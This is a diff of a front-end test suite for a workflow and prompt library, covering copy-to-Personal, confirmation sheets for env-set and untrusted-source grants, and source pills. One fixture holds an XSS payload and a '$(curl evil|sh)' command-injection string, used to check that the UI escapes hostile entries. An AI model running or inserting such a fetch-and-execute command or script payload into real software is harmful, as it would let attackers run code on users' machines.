@@ -82,6 +82,17 @@ it("reads a repo entry read-only and copies it to Personal without a write to th
   expect(await screen.findByRole("button", { name: /^Start dev server/ })).toBeVisible();
 });
 
+it("copies a repo entry by its own file and index, which count dropped entries and repeat across files", async () => {
+  const suggestions = { ...suggestionFixtures(), workflows: [{ ...suggestionFixtures().workflows[0]!, index: 5 }], prompts: [{ ...suggestionFixtures().prompts[0]!, index: 5 }] };
+  const mock = createLibraryMock({ suggestions });
+  const copy = vi.spyOn(mock, "copySuggestion");
+  const { user } = await mount(mock);
+  await pickItem(user, "Review a diff");
+  await user.click(screen.getByRole("button", { name: "Copy to Personal" }));
+  await waitFor(() => expect(copy).toHaveBeenCalledWith("p1", "prompts.json", 5));
+  expect(mock.writes).toEqual(["prompt.create:Review a diff for open redirects"]);
+});
+
 it("copies a repo entry once for a double click", async () => {
   const { user, mock } = await mount(createLibraryMock({ delayMs: 30 }));
   await pickItem(user, "Start dev server");
@@ -102,7 +113,7 @@ it("lists the entries a repository file had to skip", async () => {
 });
 
 it("shows a hostile repo entry as escaped, cut text", async () => {
-  const hostile = { ...suggestionFixtures(), workflows: [{ index: 0, name: `<img src=x onerror=alert(1)>${"n".repeat(200)}`, description: "<script>1</script>", command: `$(curl evil|sh) ${"c".repeat(9000)}`, params: [], env_set_ids: [] }] };
+  const hostile = { ...suggestionFixtures(), workflows: [{ file: "workflows.json" as const, index: 0, name: `<img src=x onerror=alert(1)>${"n".repeat(200)}`, description: "<script>1</script>", command: `$(curl evil|sh) ${"c".repeat(9000)}`, params: [], env_set_names: [] }] };
   const { user } = await mount(createLibraryMock({ suggestions: hostile }));
   await user.click(await screen.findByRole("button", { name: /^<img src=x/ }));
   const view = document.querySelector("section.lib")!;
@@ -320,4 +331,176 @@ it("uses Map-safe lookups: a hostile item id is just text", async () => {
   await personal(user);
   await pickItem(user, "constructor");
   expect(screen.getByTestId("command")).toBeVisible();
+});
+
+// A saved workflow that lists the work-laptop set: its run needs the env_values grant.
+const SET = "01je0000000000000000000001";
+const WF = "01jw0000000000000000000001";
+const withSet = () => { const fixtures = libraryFixtures(); fixtures.workflows[0]!.env_set_ids = [SET]; fixtures.workflows[0]!.params = []; fixtures.workflows[0]!.command = "npm test"; return fixtures; };
+const openRun = async (user: ReturnType<typeof userEvent.setup>, name = "Test one package") => {
+  await personal(user);
+  await pickItem(user, name);
+  await user.click(screen.getByRole("button", { name: "Run…" }));
+  const dialog = await screen.findByRole("dialog");
+  await waitFor(() => expect(within(dialog).getByTestId("rendered")).toBeVisible());
+  return dialog;
+};
+const sheet = async () => (await screen.findByRole("button", { name: "Run anyway" })).closest("dialog")!;
+
+it("asks for a confirm sheet on 409 confirm_required: the grants in words and the set names, never a value or a key", async () => {
+  const mock = createLibraryMock({ fixtures: withSet() });
+  mock.vault.set(`${SET}/API_BASE`, "https://secret.example");
+  const run = vi.spyOn(mock, "runWorkflow");
+  const { user } = await mount(mock);
+  const dialog = await openRun(user);
+  await user.click(within(dialog).getByRole("button", { name: "Run" }));
+  const confirm = await sheet();
+  expect(confirm.querySelector("h2")?.textContent).toBe("Run “Test one package”?");
+  expect(within(confirm).getByText(/saved values of these env sets go into the command’s environment/)).toBeVisible();
+  expect(within(within(confirm).getByRole("list", { name: "Env sets applied" })).getByText("work-laptop")).toBeVisible();
+  expect(confirm.textContent).not.toContain("secret.example");
+  expect(confirm.textContent).not.toContain("API_TOKEN");
+  expect(within(confirm).getByRole("button", { name: "Cancel" })).toHaveFocus();
+  expect(run).toHaveBeenCalledTimes(1);
+  expect(run.mock.calls[0]![3] ?? []).toEqual([]);
+  expect(mock.writes).toEqual([]);
+});
+
+it("resends the same run with exactly the shown grants once per click, however many times it is clicked", async () => {
+  const mock = createLibraryMock({ fixtures: withSet(), delayMs: 20 });
+  const run = vi.spyOn(mock, "runWorkflow");
+  const { user } = await mount(mock);
+  const dialog = await openRun(user);
+  await user.click(within(dialog).getByRole("button", { name: "Run" }));
+  const confirm = await sheet();
+  await user.dblClick(within(confirm).getByRole("button", { name: "Run anyway" }));
+  await waitFor(() => expect(mock.writes).toEqual([`workflow.run:${WF}:thread=t1:ack=env_values`]));
+  expect(run).toHaveBeenCalledTimes(2);
+  expect(run.mock.calls[1]).toEqual([WF, {}, { thread_id: "t1" }, ["env_values"]]);
+  expect(await within(dialog).findByText(/Started in a terminal/)).toBeVisible();
+});
+
+it("sends nothing when the sheet is cancelled, and the next run asks again", async () => {
+  const mock = createLibraryMock({ fixtures: withSet() });
+  const run = vi.spyOn(mock, "runWorkflow");
+  const { user } = await mount(mock);
+  const dialog = await openRun(user);
+  await user.click(within(dialog).getByRole("button", { name: "Run" }));
+  await user.click(within(await sheet()).getByRole("button", { name: "Cancel" }));
+  expect(run).toHaveBeenCalledTimes(1);
+  expect(mock.writes).toEqual([]);
+  await user.click(within(dialog).getByRole("button", { name: "Run" }));
+  expect(within(await sheet()).getByRole("button", { name: "Run anyway" })).toBeVisible();
+  expect(run).toHaveBeenCalledTimes(2);
+  expect(run.mock.calls[1]![3] ?? []).toEqual([]);
+});
+
+it("never remembers an ack: a workflow that lists a set asks on every run", async () => {
+  const mock = createLibraryMock({ fixtures: withSet() });
+  const run = vi.spyOn(mock, "runWorkflow");
+  const { user } = await mount(mock);
+  for (let turn = 0; turn < 2; turn += 1) {
+    const dialog = await openRun(user, turn === 0 ? "Test one package" : "Test one package");
+    await user.click(within(dialog).getByRole("button", { name: "Run" }));
+    await user.click(within(await sheet()).getByRole("button", { name: "Run anyway" }));
+    await within(dialog).findByText(/Started in a terminal/);
+    await user.click(within(dialog).getByRole("button", { name: "Close" }));
+  }
+  expect(run.mock.calls.map((call) => call[3] ?? [])).toEqual([[], ["env_values"], [], ["env_values"]]);
+});
+
+it("lists both grants for an imported workflow with a set, and asks again after an edit to its command, but not for a rename", async () => {
+  const fixtures = withSet();
+  fixtures.workflows[0]!.env_set_ids = [];
+  Object.assign(fixtures.workflows[0]!, { source: "import", needs_ack: true });
+  const mock = createLibraryMock({ fixtures });
+  const run = vi.spyOn(mock, "runWorkflow");
+  const { user } = await mount(mock);
+  let dialog = await openRun(user);
+  await user.click(within(dialog).getByRole("button", { name: "Run" }));
+  let confirm = await sheet();
+  expect(within(confirm).getByText(/came from a file, a repository or a shared link/)).toBeVisible();
+  expect(within(confirm).queryByRole("list", { name: "Env sets applied" })).toBeNull();
+  await user.click(within(confirm).getByRole("button", { name: "Run anyway" }));
+  await within(dialog).findByText(/Started in a terminal/);
+  await user.click(within(dialog).getByRole("button", { name: "Close" }));
+  // Acknowledged on the service: the next run needs no sheet.
+  dialog = await openRun(user);
+  await user.click(within(dialog).getByRole("button", { name: "Run" }));
+  await within(dialog).findByText(/Started in a terminal/);
+  expect(run.mock.calls.map((call) => call[3] ?? [])).toEqual([[], ["untrusted_source"], []]);
+  await user.click(within(dialog).getByRole("button", { name: "Close" }));
+  // An edit to the command drops it: the sheet comes back.
+  const one = (await mock.workflows())[0]!;
+  await mock.updateWorkflow(one.id, { name: one.name, description: one.description, command: "npm test --bail", params: [], env_set_ids: [] }, one.revision);
+  dialog = await openRun(user);
+  await user.click(within(dialog).getByRole("button", { name: "Run" }));
+  confirm = await sheet();
+  expect(within(confirm).getByRole("button", { name: "Run anyway" })).toBeVisible();
+});
+
+it("says a confirm this app cannot show started nothing, instead of sending an empty ack", async () => {
+  const mock = createLibraryMock();
+  mock.runWorkflow = async () => { const { ApiFailure } = await import("../../api/client"); throw new ApiFailure("confirm_required", "Confirm.", 409, { grants: [] }); };
+  const { user } = await mount(mock);
+  const dialog = await openRun(user);
+  await user.click(within(dialog).getByRole("button", { name: "Run" }));
+  expect(await within(dialog).findByText(/needs a confirmation this app can’t show, so nothing was started/)).toBeVisible();
+  expect(screen.getAllByRole("dialog")).toHaveLength(1);
+});
+
+it("shows an Imported, From repo or Shared pill for a non-local entry and none for a local one or an unknown word", async () => {
+  const fixtures = libraryFixtures();
+  Object.assign(fixtures.workflows[0]!, { source: "import" });
+  Object.assign(fixtures.workflows[1]!, { source: "shared" });
+  Object.assign(fixtures.prompts[0]!, { source: "repo" });
+  const { user } = await mount(createLibraryMock({ fixtures }));
+  await personal(user);
+  await pickItem(user, "Test one package");
+  expect(screen.getByRole("button", { name: /^Test one package\s*Imported · / })).toBeVisible();
+  expect(screen.getByRole("heading", { name: /^Test one package\s*Imported$/ })).toBeVisible();
+  await pickItem(user, "Prune merged branches");
+  expect(screen.getByRole("heading", { name: /^Prune merged branches\s*Shared$/ })).toBeVisible();
+  await pickItem(user, "Standup summary");
+  expect(screen.getByRole("heading", { name: /^Standup summary\s*From repo$/ })).toBeVisible();
+});
+
+it("shows no pill for a local entry or a source word it does not know, and never the raw word", async () => {
+  const fixtures = libraryFixtures();
+  Object.assign(fixtures.workflows[1]!, { source: "<b>weird</b>" });
+  const { user } = await mount(createLibraryMock({ fixtures }));
+  await personal(user);
+  await pickItem(user, "Test one package");
+  expect(screen.getByRole("heading", { name: "Test one package" })).toBeVisible();
+  await pickItem(user, "Prune merged branches");
+  expect(screen.getByRole("heading", { name: "Prune merged branches" })).toBeVisible();
+  expect(document.body.textContent).not.toContain("weird");
+});
+
+it("copies a repo workflow as a From repo entry that names the sets it resolved", async () => {
+  const suggestions = suggestionFixtures();
+  suggestions.workflows[0]!.env_set_names = ["work-laptop"];
+  const { user } = await mount(createLibraryMock({ suggestions }));
+  await pickItem(user, "Start dev server");
+  expect(screen.getByText(/Environment: work-laptop/)).toBeVisible();
+  await user.click(screen.getByRole("button", { name: "Copy to Personal" }));
+  await pickItem(user, "Start dev server");
+  expect(await screen.findByRole("heading", { name: /^Start dev server\s*From repo$/ }, { timeout: 3000 })).toBeVisible();
+  expect(screen.getByText(/Its next run asks you to confirm first/)).toBeVisible();
+});
+
+it("treats a keychain_unavailable on a value save as the Planned note, with the service's words and no error", async () => {
+  const mock = createLibraryMock();
+  const { user } = await mount(mock);
+  await personal(user);
+  await pickItem(user, "work-laptop");
+  await user.click(screen.getByRole("button", { name: "Add value" }));
+  mock.failNext("keychain_unavailable");
+  await user.type(screen.getByLabelText(/Value for API_TOKEN/), "tok-12345");
+  await user.click(screen.getByRole("button", { name: "Save value" }));
+  expect(await screen.findByText(/There is no usable keychain on this computer yet, so values cannot be saved/)).toBeVisible();
+  expect(screen.queryByRole("alert")).toBeNull();
+  expect(screen.queryByLabelText(/Value for API_TOKEN/)).toBeNull();
+  expect(document.body.textContent).not.toContain("tok-12345");
+  expect(mock.writes).toEqual([]);
 });
